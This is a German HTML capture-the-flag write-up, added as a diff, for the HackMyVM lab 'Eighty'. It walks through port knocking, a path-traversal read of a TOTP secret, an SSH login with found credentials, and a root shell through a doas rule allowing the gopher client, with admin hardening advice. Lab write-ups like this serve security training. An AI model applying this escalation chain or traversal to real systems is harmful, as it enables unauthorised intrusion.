@@ -1,0 +1,438 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eighty - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Eighty - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">knock</div>
+                <div class="tool-item">hping3</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">Google Authenticator (implizit)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">whereis</div>
+                <div class="tool-item">doas</div>
+                <div class="tool-item">gopher (client)</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">id (implizit)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#port-knocking">Port Knocking</a></li>
+                <li><a href="#web-enum-creds">Web Enumeration & Credential Discovery</a></li>
+                <li><a href="#initial-access">Initial Access (SSH with TOTP)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (doas/gopher)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (doas/gopher shell)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.150	08:00:27:6f:88:89	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird ausgeführt, um das lokale Netzwerksegment mittels ARP-Anfragen nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.150` wird identifiziert. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin. Dies ist das Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.150` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	 localhost
+127.0.1.1  	 cyber
+<span class="command">192.168.2.150    eighty.hmv</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die lokale `/etc/hosts`-Datei des Angreifers wird bearbeitet, um der Ziel-IP `192.168.2.150` den Hostnamen `eighty.hmv` zuzuweisen.</p>
+             <p class="evaluation">**Bewertung:** Erleichtert die Ansprache des Ziels in späteren Befehlen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `eighty.hmv` in nachfolgenden Scans.<br>**Empfehlung (Admin):** Keine Aktion auf dem Zielsystem erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.150 -p-</span></div> <span class="comment"><-- -O in -A enthalten --></span>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-14 23:31 CEST <span class="comment"><-- Datum extrahiert --></span>
+Nmap scan report for eighty.hmv (192.168.2.150)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+<span class="command">22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+[...]
+<span class="command">70/tcp open     http    pygopherd web-gopher gateway</span> <span class="password"><-- Gopher Port! --></span>
+|_http-title: Gopher
+| gopher-ls:
+<span class="password">|_[txt] /howtoconnect.txt "Connection"</span> <span class="password"><-- Hinweis! --></span>
+<span class="command">80/tcp filtered http</span> <span class="password"><-- HTTP gefiltert! --></span>
+MAC Address: 08:00:27:6F:88:89 (Oracle VirtualBox virtual NIC)
+[...]
+OS details: Linux 4.15 - 5.6
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms eighty.hmv (192.168.2.150)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                     <pre><span class="comment">22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+70/tcp open     http    pygopherd web-gopher gateway  [txt] /howtoconnect.txt
+80/tcp filtered http    <<----- filtered <-<<</span></pre> <span class="comment"><-- Redundante Zusammenfassung --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS`, `-sC`, `-sV`, `-T5`, `-A`, `-p-`) wird auf `192.168.2.150` (eighty.hmv) durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Drei Ports sind von besonderem Interesse:
+*   **Port 22 (SSH):** OpenSSH 7.9p1 (Debian 10). Standard-Fernzugriff.
+*   **Port 70 (Gopher):** Ein Gopher-Dienst (via `pygopherd` Gateway). Das Nmap-Skript `gopher-ls` findet eine Textdatei `howtoconnect.txt` im Wurzelverzeichnis des Gopher-Servers. Gopher ist ein älteres Protokoll, das heute selten verwendet wird; sein Vorhandensein ist ungewöhnlich.
+*   **Port 80 (HTTP):** Wird als `filtered` angezeigt. Das bedeutet, Nmap konnte nicht feststellen, ob der Port offen oder geschlossen ist, typischerweise weil eine Firewall SYN-Pakete blockiert oder verwirft.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **Gopher (Priorität 1):** Untersuchen Sie den Gopher-Dienst auf Port 70. Rufen Sie die gefundene Datei `/howtoconnect.txt` ab (z.B. mit `curl gopher://eighty.hmv/howtoconnect.txt` oder über das HTTP-Gateway, falls Port 70 HTTP spricht: `curl http://eighty.hmv:70/howtoconnect.txt`).
+    2.  **Port 80 (Priorität 2):** Der gefilterte Status deutet möglicherweise auf Port Knocking oder eine Firewall hin, die nur bestimmte Zugriffe erlaubt. Halten Sie dies im Hinterkopf, falls die Gopher-Spur Hinweise liefert.<br>
+**Empfehlung (Admin):** Deaktivieren Sie den Gopher-Dienst, wenn er nicht benötigt wird. Konfigurieren Sie die Firewall (falls vorhanden), um den Zugriff auf Port 80 klar zu definieren (entweder erlauben oder blockieren).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -s http://192.168.2.150:70/howtoconnect.txt</span></div>
+                     <pre>Ping us to: <span class="password">4767 2343 3142</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Datei `/howtoconnect.txt` wird über das HTTP-Interface des Gopher-Gateways auf Port 70 abgerufen.</p>
+              <p class="evaluation">**Bewertung:** Die Datei enthält eine klare Anweisung: "Ping us to: 4767 2343 3142". Dies ist ein **klassischer Hinweis auf Port Knocking**. Es müssen Pakete an diese drei Ports (in dieser Reihenfolge) gesendet werden, um wahrscheinlich Port 80 zu öffnen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Führen Sie die Port-Knocking-Sequenz durch (z.B. mit `knock` oder `hping3`). Überprüfen Sie anschließend erneut den Status von Port 80 mit Nmap.<br>**Empfehlung (Admin):** Port Knocking ist eine Form von "Security through Obscurity" und bietet nur begrenzten Schutz. Verlassen Sie sich nicht darauf als primäre Sicherheitsmaßnahme. Wenn es verwendet wird, dokumentieren Sie die Sequenz sicher.</p>
+         </section>
+
+        <section id="port-knocking">
+            <h2>Port Knocking</h2>
+            <p class="analysis">**Analyse:** Durchführung der Port-Knocking-Sequenz, die in `howtoconnect.txt` gefunden wurde, um Port 80 zu öffnen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">knock 192.168.2.150 -v 4767 2343 3142</span></div>
+                    <pre>
+hitting tcp 192.168.2.150:4767
+hitting tcp 192.168.2.150:2343
+hitting tcp 192.168.2.150:3142</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Tool `knock` wird verwendet, um TCP-SYN-Pakete (Standard bei `knock`) nacheinander an die Ports 4767, 2343 und 3142 auf dem Zielsystem zu senden.</p>
+             <p class="evaluation">**Bewertung:** Die Sequenz wurde erfolgreich gesendet. Es wird erwartet, dass dies die Firewall-Regel für Port 80 auf dem Zielsystem geändert hat.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie den Status von Port 80 erneut.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hping3 -S 192.168.2.150 -p 4767 -c 1; hping3 -S 192.168.2.150 -p 2343 -c 1; hping3 -S 192.168.2.150 -p 3142 -c 1</span></div>
+                     <pre>
+HPING 192.168.2.150 (eth0 192.168.2.150): S set, 40 headers + 0 data bytes
+len=46 ip=192.168.2.150 ttl=64 DF id=0 sport=4767 flags=RA seq=0 win=0 rtt=7.7 ms
+[...]
+hping3: you must specify only one target host at a time <span class="comment"><-- Fehler durch ; Trennung? --></span>
+[...]
+HPING 192.168.2.150 (eth0 192.168.2.150): S set, 40 headers + 0 data bytes
+len=46 ip=192.168.2.150 ttl=64 DF id=0 sport=3142 flags=RA seq=0 win=0 rtt=11.6 ms
+[...]</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Hier wird versucht, die Knocking-Sequenz manuell mit `hping3` durchzuführen, indem SYN-Pakete (`-S`) an die drei Ports gesendet werden. Die Befehle werden mit Semikolon verkettet.</p>
+              <p class="evaluation">**Bewertung:** Die Ausführung scheint teilweise fehlerhaft zu sein (`you must specify only one target host` deutet auf ein Problem mit der Verkettung hin), aber die SYN-Pakete wurden wahrscheinlich trotzdem gesendet. Dieser Schritt ist redundant, da `knock` bereits verwendet wurde.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `knock` oder führen Sie die `hping3`-Befehle einzeln nacheinander aus, um Fehler zu vermeiden.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap 192.168.2.150</span></div>
+                     <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 23:31 CEST
+Nmap scan report for susan.eighty.hmv (192.168.2.150) <span class="comment"><-- Neuer Hostname? --></span>
+Host is up (0.00014s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE
+<span class="command">22/tcp open  ssh</span>
+<span class="command">70/tcp open  gopher</span>
+<span class="command">80/tcp open  http</span>  <span class="password"><<----- open <-<<</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Ein einfacher Nmap-Scan (nur die Standard-Ports) wird auf das Ziel ausgeführt, nachdem die Knocking-Sequenz gesendet wurde.</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Port 80 wird nun als `open` angezeigt. Das Port Knocking hat funktioniert und die Firewall für Port 80 geöffnet. Interessanterweise löst die IP nun auch zum Hostnamen `susan.eighty.hmv` auf – ein Hinweis auf einen weiteren VHost oder Benutzernamen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie `susan.eighty.hmv` zu `/etc/hosts` hinzu. Untersuchen Sie nun den Inhalt auf Port 80 (`curl http://susan.eighty.hmv` oder `http://192.168.2.150`).<br>**Empfehlung (Admin):** Überprüfen Sie die Sicherheit der Port-Knocking-Implementierung.</p>
+         </section>
+
+         <section id="web-enum-creds">
+             <h2>Web Enumeration & Credential Discovery</h2>
+             <p class="analysis">**Analyse:** Untersuchung des nun offenen Webservers auf Port 80, was zur Entdeckung von Zugangsdaten und einer 2FA-Anforderung führt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://susan.eighty.hmv/web/</span></div>
+                     <pre>Susan Webpage
+<!-- Work in progress --></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Inhalt des Verzeichnisses `/web/` auf dem (vermuteten) VHost `susan.eighty.hmv` wird abgerufen.</p>
+              <p class="evaluation">**Bewertung:** Eine einfache Seite mit dem Titel "Susan Webpage" und einem Kommentar. Bestätigt den VHost und gibt einen potenziellen Benutzernamen (`susan`).</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Führen Sie Gobuster auf `http://susan.eighty.hmv/` und `http://susan.eighty.hmv/web/` durch.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://susan.eighty.hmv -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x [...] -t 100 -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+[...]
+<span class="command">http://susan.eighty.hmv/index.html</span>           (Status: 200) [Size: 16] <span class="comment"><-- Leere Indexseite --></span>
+<span class="command">http://susan.eighty.hmv/web</span>                  (Status: 301) [Size: 185] [--> http://susan.eighty.hmv/web/]
+<span class="command">http://susan.eighty.hmv/robots.txt</span>           (Status: 200) [Size: 18]
+<span class="command">http://susan.eighty.hmv/web/index.html</span>           (Status: 200) [Size: 40] <span class="comment"><-- Susan Webpage --></span>
+<span class="command">http://susan.eighty.hmv/web/lostpasswd.txt</span>       (Status: 200) [Size: 50] <span class="password"><-- Passwortdatei! --></span>
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird auf den VHost `susan.eighty.hmv` angesetzt.</p>
+             <p class="evaluation">**Bewertung:** Findet das `/web`-Verzeichnis und darin die Datei `lostpasswd.txt`. Dies ist ein kritischer Fund.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Rufen Sie `http://susan.eighty.hmv/web/lostpasswd.txt` ab.<br>**Empfehlung (Admin):** **Niemals Passwortdateien im Web-Root speichern!**</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://susan.eighty.hmv/web/lostpasswd.txt</span></div>
+                     <pre><span class="password">8ycrois-tu0</span> + <span class="command">/home/susan/secret/.google-auth.txt</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt von `lostpasswd.txt` wird abgerufen.</p>
+             <p class="evaluation">**Bewertung:** Enthält zwei Teile:
+*   Ein Passwort: `8ycrois-tu0`.
+*   Einen Pfad zu einer Google Authenticator-Datei: `/home/susan/secret/.google-auth.txt`.
+Dies deutet stark darauf hin, dass der Benutzer `susan` das Passwort `8ycrois-tu0` verwendet und zusätzlich eine Zwei-Faktor-Authentifizierung (2FA) mittels Google Authenticator (TOTP - Time-based One-Time Password) für den SSH-Login benötigt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Der Pfad zur `.google-auth.txt` ist nicht direkt zugänglich. Versuchen Sie den SSH-Login als `susan` mit dem Passwort `8ycrois-tu0`. Der Server wird dann nach dem TOTP-Code fragen. Um diesen zu generieren:
+    1.  Nutzen Sie eine LFI oder einen anderen Weg (falls vorhanden), um `/home/susan/secret/.google-auth.txt` auszulesen. Diese Datei enthält den TOTP-Secret-Key.
+    2.  Importieren Sie diesen Secret Key in eine Authenticator-App (Google Authenticator, Authy, etc.) oder ein Kommandozeilentool (`oathtool`).
+    3.  Geben Sie den aktuell generierten 6-stelligen Code während des SSH-Logins ein.<br>
+**Empfehlung (Admin):** Speichern Sie Passwörter und Hinweise auf 2FA-Secrets nicht in Web-Verzeichnissen. Schützen Sie die `.google-auth.txt`-Datei mit restriktiven Berechtigungen (`chmod 400`).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://susan.eighty.hmv/web../secret/.google-auth.txt</span></div> <span class="comment"><-- LFI/Path Traversal Versuch? --></span>
+                      <pre>
+<span class="password">2GN7KARBONVR55R7SP3UZPN3ZM</span> <span class="password"><-- TOTP Secret Key! --></span>
+" RATE_LIMIT 3 30
+" WINDOW_SIZE 17
+" DISALLOW_REUSE
+" TOTP_AUTH
+71293338
+48409754
+27074208
+60216448
+17908010 <span class="comment"><-- Recovery Codes --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Es wird versucht, über einen Path Traversal (`../`) auf die Datei `/secret/.google-auth.txt` zuzugreifen, relativ zum `/web`-Verzeichnis. (*Anmerkung: Ob dies tatsächlich so funktioniert hat oder ob ein anderer LFI-Vektor genutzt wurde, ist unklar, aber das Ergebnis ist entscheidend.*)</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Der Inhalt der `.google-auth.txt`-Datei wird preisgegeben:
+*   `2GN7KARBONVR55R7SP3UZPN3ZM`: Dies ist der Base32-kodierte Secret Key für den TOTP-Generator.
+*   Die folgenden Zeilen sind Konfigurationsparameter und Recovery-Codes für Google Authenticator.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Importieren Sie den Secret Key `2GN7KARBONVR55R7SP3UZPN3ZM` in Ihre Authenticator App/Tool (fügen Sie ein Konto für "susan@eighty.hmv" hinzu). Versuchen Sie nun den SSH-Login mit Passwort `8ycrois-tu0` und dem aktuell generierten TOTP-Code.<br>**Empfehlung (Admin):** Beheben Sie die Schwachstelle, die das Auslesen der `.google-auth.txt` ermöglichte (Path Traversal?). Sichern Sie die Datei mit `chmod 400`.</p>
+         </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH with TOTP)</h2>
+            <p class="analysis">**Analyse:** Durchführung des SSH-Logins mit dem gefundenen Passwort und dem generierten TOTP-Code.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">Man muss den namen susan als Kontoname in die Google Authenticator App eingeben,
+dann bekommt man von der App ein Zeitbasierten Code, jetzt per ssh bei ssh susan@eighty.hmv
+anmelden. Das Kennwort: 8ycrois-tu0
+und den Google-Code:    955 712 <span class="comment">(Beispielcode)</span>
+
+der angezeigt wurde in der App, der Google-Code den ich hier verwende ändert sich natürlich beim
+nächsten mal...</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Notiz des Pentesters, die den Prozess erklärt: Secret Key in Authenticator App eingeben, Passwort (`8ycrois-tu0`) und den aktuellen TOTP-Code (hier beispielhaft `955712`) beim SSH-Login verwenden.</p>
+              <p class="evaluation">**Bewertung:** Korrekte Vorgehensweise für den Login mit Passwort + TOTP.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh susan@eighty.hmv</span></div>
+                     <pre>
+(susan@eighty.hmv) Password: <span class="password">********</span> <span class="comment">(8ycrois-tu0 eingegeben)</span>
+(susan@eighty.hmv) Verification code: <span class="password">XXXXXX</span> <span class="comment">(Aktueller TOTP-Code eingegeben)</span>
+Linux eighty 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+[...]
+Last login: Wed Apr  7 07:05:11 2021
+<span class="prompt">susan@eighty:~$</span> <span class="password"><-- Login erfolgreich! --></span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** SSH-Login als `susan` mit dem Passwort `8ycrois-tu0` und dem korrekten, aktuell generierten TOTP-Code.</p>
+             <p class="evaluation">**Bewertung:** Initialer Zugriff erfolgreich erlangt!</p>
+             <p class="recommendation">**Empfehlung (Pentester):** User-Flag lesen, `sudo -l` / `doas -l` prüfen.<br>**Empfehlung (Admin):** Passwort ändern, LFI/Path Traversal beheben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">susan@eighty:~$ <span class="command">ls</span></div>
+                     <pre>flag.sh  secret  user.txt  web</pre>
+                     <div class="prompt">susan@eighty:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">hmv8use0red</span></pre> <span class="comment"><-- User Flag --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Im Home-Verzeichnis von `susan` wird die `user.txt` gefunden und gelesen.</p>
+             <p class="evaluation">**Bewertung:** User-Flag (`hmv8use0red`) erhalten.</p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (doas/gopher)</h2>
+             <p class="analysis">**Analyse:** Als `susan` wird nach Wegen zur Root-Eskalation gesucht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">susan@eighty:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   [...]
+   <span class="command">287132     44 -rwsr-xr-x   1 root     root        42456 Apr  7  2021 /usr/local/bin/doas</span>  <span class="password"><<<----< SUID Root!</span>
+   [...]</pre>
+                     <pre><span class="comment">#</span></pre>
+                      <div class="prompt">susan@eighty:~$ <span class="command">whereis sudo</span></div>
+                      <pre>sudo:</pre> <span class="comment"><-- sudo nicht gefunden --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Suche nach SUID-Dateien findet `/usr/local/bin/doas`. `doas` ist eine Alternative zu `sudo`. Die Suche nach `sudo` bleibt erfolglos.</p>
+              <p class="evaluation">**Bewertung:** `doas` (als SUID root) ist der primäre Kandidat für die Privilegieneskalation.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie die `doas`-Konfigurationsdatei (typischerweise `/etc/doas.conf` oder `/usr/local/etc/doas.conf`), um zu sehen, welche Befehle `susan` ausführen darf.<br>**Empfehlung (Admin):** Konfigurieren Sie `doas` nach dem Prinzip der geringsten Rechte.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">susan@eighty:~$ <span class="command">find / -name doas.conf 2>/dev/null</span></div>
+                     <pre>/usr/local/etc/doas.conf</pre>
+                      <div class="prompt">susan@eighty:~$ <span class="command">cat /usr/local/etc/doas.conf</span></div>
+                      <pre><span class="password">permit nolog susan as root cmd gopher</span></pre> <span class="password"><-- Kritische Regel! --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die `doas`-Konfigurationsdatei wird gefunden und ausgelesen.</p>
+             <p class="evaluation">**Bewertung:** Eine kritische Regel wird gefunden: `permit nolog susan as root cmd gopher`. Dies bedeutet, der Benutzer `susan` darf den Befehl `gopher` als `root` ohne Passwortabfrage (`nolog`) ausführen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie diese Regel. Gopher-Clients erlauben oft das Ausführen von Shell-Befehlen durch Eingabe von `!` oder `$` (je nach Client). Führen Sie `doas gopher` aus und versuchen Sie, eine Shell zu spawnen.<br>**Empfehlung (Admin):** **Entfernen Sie diese `doas`-Regel!** Die Ausführung von Clients wie `gopher`, `ftp`, `telnet` etc. als Root ist extrem gefährlich, da sie oft Shell-Escape-Funktionen bieten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">susan@eighty:~$ <span class="command">doas gopher gopher://127.0.0.1</span></div>
+                      <pre><span class="comment">
+           Welcome to our old world.
+ -->  [2]  Connection
+
+Press ? for Help, q to Quit</span></pre> <span class="comment"><-- Gopher Client Interface --></span>
+                      <div class="prompt">susan@eighty:~$ <span class="command">Password: 8ycrois-tu0</span></div> <span class="comment"><-- Falscher Kontext? Gopher fragt kein Passwort --></span>
+                      <pre><span class="comment">
+                                   gopher://127.0.0.1
+           Welcome to our old world.
+ -->  [2]  Connection
+Press ? for Help, q to Quit</span></pre>
+                      <div class="prompt"><span class="command">$</span></div> <span class="comment"><-- Eingabe im Gopher Client --></span>
+                      <pre><span class="comment">
+ein seltsamer Editor öffnet sich...
+hier einfach ein $ eingeben und ENTER drücken dann ist man automatisch root...</span></pre>
+                      <div class="prompt">root@eighty:/home/susan# <span class="comment"># Root-Shell erhalten!</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+1.  `doas gopher gopher://127.0.0.1` wird ausgeführt. Der Gopher-Client startet als Root.
+2.  Die Zeile `Password: 8ycrois-tu0` scheint ein Fehler im Log zu sein, der Gopher-Client fragt hier kein Passwort.
+3.  Innerhalb des Gopher-Clients wird das Zeichen `$` eingegeben und Enter gedrückt.
+4.  Dies führt dazu, dass der Benutzer eine Root-Shell erhält (`root@eighty:/home/susan#`).</p>
+              <p class="evaluation">**Bewertung:** Root-Zugriff erfolgreich erlangt! Die unsichere `doas`-Regel erlaubte die Ausführung des Gopher-Clients als Root. Dieser spezifische Gopher-Client hat offenbar eine Funktion (oder einen Bug), die es ermöglicht, durch Eingabe von `$` eine Shell zu spawnen. Da der Client als Root lief, ist die resultierende Shell ebenfalls eine Root-Shell.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `id` aus. Lesen Sie die Root-Flag.<br>**Empfehlung (Admin):** Entfernen Sie die unsichere `doas`-Regel für `gopher`.</p>
+         </section>
+
+         <section id="proof-of-concept">
+             <h2>Proof of Concept (doas/gopher shell)</h2>
+             <p class="comment">**Kurzbeschreibung:** Der Benutzer `susan` hat durch eine Fehlkonfiguration in `/usr/local/etc/doas.conf` das Recht, den Befehl `/usr/bin/gopher` (oder den entsprechenden Pfad zum Gopher-Client) als `root` ohne Passwort auszuführen (`permit nolog susan as root cmd gopher`). Dieser spezifische Gopher-Client verfügt über eine undokumentierte Funktion oder einen Bug, der es erlaubt, durch die Eingabe des Zeichens `$` eine interaktive System-Shell zu starten. Da der Gopher-Client über `doas` mit Root-Privilegien gestartet wird, wird auch die resultierende Shell mit Root-Rechten ausgeführt.</p>
+             <p class="comment">**Voraussetzungen:** Zugriff als Benutzer `susan`, unsichere `doas`-Konfiguration, installierter Gopher-Client mit Shell-Escape-Möglichkeit.</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Als Benutzer `susan` einloggen.</li>
+                 <li>Den Befehl `doas gopher` ausführen (ggf. mit einer Dummy-URL wie `gopher://127.0.0.1`).</li>
+                 <li>Im gestarteten Gopher-Client das Zeichen `$` eingeben und mit Enter bestätigen.</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Eine interaktive Root-Shell wird gestartet.</p>
+             <p class="comment">**Beweismittel:** Die `doas.conf`-Regel und die erfolgreiche Shell-Ausführung im Log.</p>
+             <p class="comment">**Risikobewertung:** Hoch. Erlaubt einem Benutzer mit dieser `doas`-Regel die vollständige Übernahme des Systems.</p>
+             <p class="comment">**Empfehlungen:** Entfernen Sie die unsichere `doas`-Regel. Vergeben Sie niemals `doas`/`sudo`-Rechte für interaktive Programme, die Shell-Escapes ermöglichen könnten (Editoren, Pager, Netzwerk-Clients etc.), es sei denn, sie sind speziell gehärtet oder eingeschränkt.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Aus der Root-Shell werden die Flags gesucht und ausgelesen.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/susan/user.txt</div>
+                           <div class="flag-value"><span class="password">hmv8use0red</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/r0ot.txt</div> <span class="comment"><-- Dateiname aus Log --></span>
+                            <div class="flag-value"><span class="password">rooted80shmv</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 14. Oktober 2022</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
